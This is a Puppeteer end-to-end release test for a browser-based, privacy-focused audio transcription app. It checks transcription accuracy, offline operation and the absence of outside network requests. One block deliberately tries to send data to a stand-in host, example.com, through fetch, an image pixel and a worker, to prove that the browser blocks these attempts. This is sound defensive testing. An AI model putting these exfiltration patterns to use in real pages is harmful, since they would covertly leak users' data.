// End-to-end check in a real (headless) Chrome, run before every release.
// Uses only a public-domain speech sample (JFK, 1961). Never real recordings.
//
// It proves four things:
//   1. a WAV and a longer MP3 are transcribed correctly
//   2. the app made no request to any other website while doing it
//   3. attempts to send data elsewhere are blocked by the browser
//   4. it still works with the network switched off
import puppeteer from 'puppeteer-core';
import { createServer } from 'node:http';
import { readFile } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { extname, join, normalize } from 'node:path';

const root = new URL('..', import.meta.url).pathname;
const dist = join(root, 'dist');
const PREFIX = '/session-transcriber/'; // mimic GitHub Pages serving from a sub-folder
const TYPES = {
  '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.mjs': 'text/javascript', '.css': 'text/css',
  '.json': 'application/json', '.webmanifest': 'application/manifest+json', '.wasm': 'application/wasm',
  '.svg': 'image/svg+xml', '.png': 'image/png', '.onnx': 'application/octet-stream', '.txt': 'text/plain',
};

const server = createServer(async (req, res) => {
  const path = decodeURIComponent(new URL(req.url, 'http://x').pathname);
  if (!path.startsWith(PREFIX)) { res.writeHead(404).end(); return; }
  let rel = normalize(path.slice(PREFIX.length));
  if (rel === '.' || rel === '') rel = 'index.html';
  if (rel.startsWith('..')) { res.writeHead(403).end(); return; }
  try {
    const body = await readFile(join(dist, rel));
    res.writeHead(200, { 'Content-Type': TYPES[extname(rel)] || 'application/octet-stream', 'Cache-Control': 'max-age=600' }).end(body);
  } catch (_) { res.writeHead(404).end(); }
});
await new Promise((r) => server.listen(0, '127.0.0.1', r));
const origin = `http://127.0.0.1:${server.address().port}`;
const url = origin + PREFIX;

const chrome = process.env.CHROME_PATH || ['/usr/bin/google-chrome', '/usr/bin/google-chrome-stable', '/usr/bin/chromium-browser', '/usr/bin/chromium'].find(existsSync);
const browser = await puppeteer.launch({ executablePath: chrome, headless: true, args: ['--no-sandbox'] });
const page = await browser.newPage();
const foreign = [];
const failed = [];
const logs = [];
page.on('request', (r) => { const u = r.url(); if (!u.startsWith(origin) && !u.startsWith('blob:') && !u.startsWith('data:')) foreign.push(u); });
page.on('requestfailed', (r) => failed.push(`${r.url()} (${r.failure()?.errorText})`));
page.on('console', (m) => logs.push(`[${m.type()}] ${m.text()}`));
page.on('pageerror', (e) => logs.push(`[pageerror] ${e.message}`));
page.on('dialog', (d) => d.accept());

const results = [];
const check = (name, ok, detail = '') => { results.push({ name, ok }); console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? '  — ' + detail : ''}`); };
const plain = (s) => s.toLowerCase().replace(/[^a-z ]+/g, ' ').replace(/\s+/g, ' ');

async function ready() {
  await page.waitForFunction(() => !document.getElementById('step-file').hidden, { timeout: 180000 });
}
async function pickModel() {
  if (!process.env.TEST_MODEL) return;
  await page.click(`input[name="model"][value="${process.env.TEST_MODEL}"]`);
}
async function transcribe(file) {
  const input = await page.$('#file');
  await input.uploadFile(join(root, 'tests', file));
  await page.waitForFunction(() => !document.getElementById('start').disabled);
  const t0 = Date.now();
  await page.click('#start');
  await page.waitForFunction(() => {
    const s = document.getElementById('status').textContent;
    const e = document.getElementById('error');
    return s.startsWith('Finished') || !e.hidden;
  }, { timeout: 900000 });
  const error = await page.$eval('#error', (e) => (e.hidden ? '' : e.textContent));
  if (error) throw new Error(`App showed an error: ${error}`);
  return { text: await page.$eval('#out', (t) => t.value), seconds: (Date.now() - t0) / 1000 };
}

let exit = 1;
try {
  await page.goto(url, { waitUntil: 'load' });
  await ready();
  await pickModel();
  const info = await page.evaluate(() => ({ isolated: self.crossOriginIsolated, controlled: !!navigator.serviceWorker.controller, cores: navigator.hardwareConcurrency }));
  check('service worker in control', info.controlled);
  check('multi-core mode available (cross-origin isolated)', info.isolated, `${info.cores} cores`);

  const short = await transcribe('jfk.wav');
  console.log('--- jfk.wav ---\n' + short.text);
  check('WAV transcribed correctly', plain(short.text).includes('ask not what your country can do for you'), `${short.seconds.toFixed(1)} s for 11 s of audio`);
  check('lines start with a time', /^\[\d\d:\d\d\] /.test(short.text));

  const long = await transcribe('long.mp3');
  console.log('--- long.mp3 ---\n' + long.text);
  const hits = (plain(long.text).match(/ask not what your country can do for you/g) || []).length;
  const stamps = [...long.text.matchAll(/^\[(\d\d):(\d\d)\]/gm)].map((m) => +m[1] * 60 + +m[2]);
  check('88-second stereo MP3 transcribed across several sections', hits >= 7, `${hits}/8 repeats found, ${long.seconds.toFixed(1)} s for 88 s of audio`);
  check('times increase and reach the end of the recording', stamps.every((v, i) => i === 0 || v >= stamps[i - 1]) && Math.max(...stamps) >= 70, `last line at ${Math.max(...stamps)} s`);

  const blocked = await page.evaluate(async () => {
    const out = {};
    try { await fetch('https://example.com/?leak=1', { mode: 'no-cors' }); out.fetch = 'SENT'; } catch (_) { out.fetch = 'blocked'; }
    out.beacon = await new Promise((resolve) => { const i = new Image(); i.onload = () => resolve('SENT'); i.onerror = () => resolve('blocked'); i.src = 'https://example.com/pixel.png?leak=1'; });
    try {
      const w = new Worker(URL.createObjectURL(new Blob(["fetch('https://example.com/?leak=2',{mode:'no-cors'}).then(()=>postMessage('SENT'),()=>postMessage('blocked'))"], { type: 'text/javascript' })));
      out.worker = await new Promise((resolve) => { w.onmessage = (e) => resolve(e.data); w.onerror = () => resolve('blocked'); });
    } catch (_) { out.worker = 'blocked'; }
    out.storage = { local: localStorage.length, idb: (await indexedDB.databases?.())?.length ?? 0 };
    return out;
  });
  check('sending data to another website is blocked (fetch, image, worker)', blocked.fetch === 'blocked' && blocked.beacon === 'blocked' && blocked.worker === 'blocked', JSON.stringify(blocked));
  check('nothing written to browser storage', blocked.storage.local === 0 && blocked.storage.idb === 0);
  const leaked = foreign.filter((u) => !u.startsWith('https://example.com/'));
  check('app itself contacted no other website', leaked.length === 0, leaked.join(', '));

  await page.setOfflineMode(true);
  await page.goto(url, { waitUntil: 'load' }); // fresh visit with no network
  await ready();
  await pickModel();
  const offline = await transcribe('jfk.wav');
  check('works with the network switched off', plain(offline.text).includes('ask not what your country can do for you'), `${offline.seconds.toFixed(1)} s`);

  exit = results.every((r) => r.ok) ? 0 : 1;
} catch (err) {
  console.log('FAIL  test run stopped:', err.message);
  console.log(logs.slice(-25).join('\n'));
  console.log('failed requests:', failed.slice(-10).join('\n'));
} finally {
  await browser.close();
  server.close();
}
console.log(exit === 0 ? '\nAll checks passed.' : '\nSome checks FAILED.');
process.exit(exit);
